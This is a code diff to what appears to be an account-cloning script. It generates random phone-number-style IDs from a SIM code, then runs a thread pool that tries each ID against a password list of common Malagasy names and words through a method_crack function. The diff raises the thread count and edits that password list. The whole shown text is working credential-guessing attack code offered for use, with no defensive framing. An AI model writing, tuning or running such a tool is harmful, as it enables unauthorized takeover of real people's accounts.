@@ -108,7 +108,7 @@ def BD_CLONING():
     for nmbr in range(limit):
         nmp=''.join(map(str, generate_random_sequence(7)))
         user.append(nmp)
-    with tred(max_workers=82) as Dipto:
+    with tred(max_workers=90) as Dipto:
         tl=str(len(user))
         print(' TOTAL ACCOUNT : '+tl)
         print(' YOUR SIM CODE : '+code)
@@ -116,7 +116,7 @@ def BD_CLONING():
         linex()
         for psx in user:
             ids=code+psx
-            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'fanantenana','Fanantenana','nirina','nirina','tsilavina','Tsilavina','narovana','randria','Randria','tantely','Tantely','anjara','Anjara','fitahina','Fitahina','narindra','Narindra','sitraka','Sitraka','safidy','Safidy','Narovana','sarindra','Sarindra','prisca','Prisca','princia','Princia','tsiresy','Tsiresy','diamondra','Diamondra','valisoa','Valisoa','zanako','Zanako','koloina','Koloina','finoana','Finoana','Sarobidy','sarobidy','fitiavana','Fitiavana','mandresy','Mandresy','mahery','Mahery','malala','Malala','fandresena','Fandresena','solofo','Solofo','lalaina','Lalaina','rakotomalala','Rakotomalala','nantenaina','Nantenaina','faniry','Faniry','rakoto','Rakoto','fanomezana','Fanomezana','finoana','Finoana','fiderana','Fiderana','lafatra','Lafatra','sahaza','Sahaza','lahatra','Lahatra','tahiry','Tahiry','mihary','Mihary','tolotra','Tolotra','hasina','Hasina','santatra','Santatra','sambatra','Sambatra','nicolas','Nicolas','antananarivo','Antananarivo','malagasy','Malagasy','mirado','Mirado','andria','Andria','nomenjanahary','Nomenjanahary']
+            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'fanantenana','Fanantenana','nirina','nirina','tsilavina','Tsilavina','narovana','randria','Randria','lafatra','Lafatra','lahatra','Lahatra','tahiry','Tahiry','mihary','Mihary','hasina','Hasina','santatra','Santatra','antananarivo','Antananarivo','malagasy','Malagasy','andria','Andria','nomenjanahary','Nomenjanahary','tantely','Tantely','anjara','Anjara','fitahina','Fitahina','narindra','Narindra','sitraka','Sitraka','safidy','Safidy','Narovana','sarindra','Sarindra','harena','Harena','princia','Princia','tsiresy','Tsiresy','diamondra','Diamondra','valisoa','Valisoa','zanako','Zanako','koloina','Koloina','finoana','Finoana','Sarobidy','sarobidy','fitiavana','Fitiavana','mandresy','Mandresy','mahery','Mahery','malala','Malala','fandresena','Fandresena','solofo','Solofo','lalaina','Lalaina','rakotomalala','Rakotomalala','nantenaina','Nantenaina','faniry','Faniry','rakoto','Rakoto','fanomezana','Fanomezana','finoana','Finoana','fiderana','Fiderana']
             Dipto.submit(method_crack,ids,passlist)
             
     linex()
